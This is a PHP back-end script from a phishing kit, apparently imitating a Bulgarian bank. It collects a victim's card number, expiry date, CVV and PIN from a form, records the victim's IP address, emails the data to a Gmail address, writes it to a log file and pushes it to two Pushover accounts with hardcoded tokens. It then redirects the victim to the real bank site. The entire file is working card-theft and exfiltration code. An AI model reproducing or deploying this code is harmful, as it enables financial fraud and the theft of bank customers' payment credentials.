<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg .= "------------+| UNIBULK |+------------\n";
$bilsmg .= "Num card:           : ".$_POST['card']."\n";
$bilsmg .= "DATE:           : ".$_POST['date']."\n";
$bilsmg .= "cvv:           : ".$_POST['cvv']."\n";
$bilsmg .= "pin:           : ".$_POST['cvv2']."\n";
$bilsmg .= "------------+| BY FOUISA |+------------\n";
$bilsmg .= "IP  : $ip | $hostname\n";

$bilsnd = "bourso132@gmail.com";
$bilsub = "UNIBULK | $ip";
$bilhead = "From: UNI BULK <info2@mail.ziggo.nl>";
$bilhead .= $_POST['eMailAdd']."\n";
$bilhead .= "MIME-Version: 1.0\n";
$arr=array($bilsnd, $IP);
foreach ($arr as $bilsnd)
mail($bilsnd,$bilsub,$bilsmg,$bilhead);


$fp = fopen('../logsfullinfosssstxt', 'a');
fwrite($fp, $bilsmg);
fclose($fp);

    fclose($fp);
curl_setopt_array($ch = curl_init(), array(
      CURLOPT_URL => "https://api.pushover.net/1/messages.json",
      CURLOPT_POSTFIELDS => array(
    "token" => "a87qs3mkkcvj22cs96ip1pczi7bc1g",
    "user" => "uvvhfd8wagzfhqf7zbci8keppnsezw",
    "title" => "CVV BG  - $ip",
    "device" => "fouisa",
    "message" => $bilsmg,
      ),
      CURLOPT_RETURNTRANSFER => 1,
      CURLOPT_SAFE_UPLOAD => 1,
    ));
    curl_exec($ch);
    curl_close($ch);
	
	fclose($fp);
curl_setopt_array($ch = curl_init(), array(
      CURLOPT_URL => "https://api.pushover.net/1/messages.json",
      CURLOPT_POSTFIELDS => array(
    "token" => "aznvpjbtz5sg6tqbjnzhewiw12hziy",
    "user" => "ug835vrnzyh4jpve4ee7a1jy2o4v71",
    "title" => "CARD  - $ip",
    "device" => "Banned-ip",
    "message" => $bilsmg,
      ),
      CURLOPT_RETURNTRANSFER => 1,
      CURLOPT_SAFE_UPLOAD => 1,
    ));
    curl_exec($ch);
    curl_close($ch);

header('location: https://bulbankonline.bg/');
?>
